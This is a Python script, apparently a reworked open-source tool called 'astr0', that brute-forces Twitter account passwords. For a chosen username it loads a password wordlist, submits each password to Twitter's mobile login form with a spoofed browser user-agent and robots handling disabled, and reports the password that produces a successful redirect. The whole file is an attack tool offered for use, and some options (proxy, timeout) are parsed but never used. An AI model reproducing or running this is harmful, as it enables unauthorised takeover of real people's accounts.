import mechanize
import argparse
import sys
import os

print('''\033[1;36m

    .'``.``.
 __/ (o) `, `.
'-=`,     ;   `.
    \    :      `-.
    /    ';        `.
   /      .'         `.
   |     (      `.     `-.._
    \     \` ` `. \         `-.._
     `.   ;`-.._ `-`._.-. `-._   `-._
       `..'     `-.```.  `-._ `-.._.'
         `--..__..-`--'      `-.,'
            `._)`/
             /--(
          -./,--'`-,
       ,^--(                    
       ,--' `-,         
        *************************************
        * -> astr0 v1.0 Twitter brute-force *
        * -> Código readapitado e melhorado *
        * -> Twitter: @strixnull            *
        *************************************                                                  
\033[1;m''')

parser = argparse.ArgumentParser(description="[==] This simple script to penetrate accounts Twitter brute-force")
parser.add_argument('-u', required=True, default=None, help='Target username.')
parser.add_argument('-p', required=True, default=None, help='Password list / Path of password file.')
parser.add_argument('-t', required=False, help='timeout seconds for new request.')
parser.add_argument('-proxy', required=False, default=None, help='Proxy list / Path of Proxy list file.')
args = vars(parser.parse_args())

b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True

b.addheaders = [('User-agent',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/45.0.2454101')]

username = args['u']
passwordList = args['p']
timeout = args['t']
proxyList = args['proxy']

if os.path.exists(args['p']) == False:
    sys.exit('Arquivo de senha não existente')

def Twitter():
    password = open(passwordList).read().splitlines()
    try_login = 0
    print("Target Account: {}".format(username))
    for password in password:
        try_login += 1
        if try_login == 10:
            try_login = 0
        sys.stdout.write('\r[-] {} [-] '.format(password))
        sys.stdout.flush()
        url = "https://mobile.twitter.com/login"
        try:
            response = b.open(url, timeout=2)
            b.select_form(nr=0)
            b.form['session[username_or_email]'] = username
            b.form['session[password]'] = password
            b.method = "POST"
            response = b.submit()

            if len(response.geturl()) == 27:
                print(f'\n[+] PASSWORD FOUND [{username}]:[{password}] [+]')
                break
            else:
                print('PASSWORD NOT FOUND!')
        except KeyboardInterrupt:
            print('\n<<< FIM DO PROGRAMA >>>')
            sys.stdout.flush()
            break
            
if __name__ == '__main__':
    Twitter()
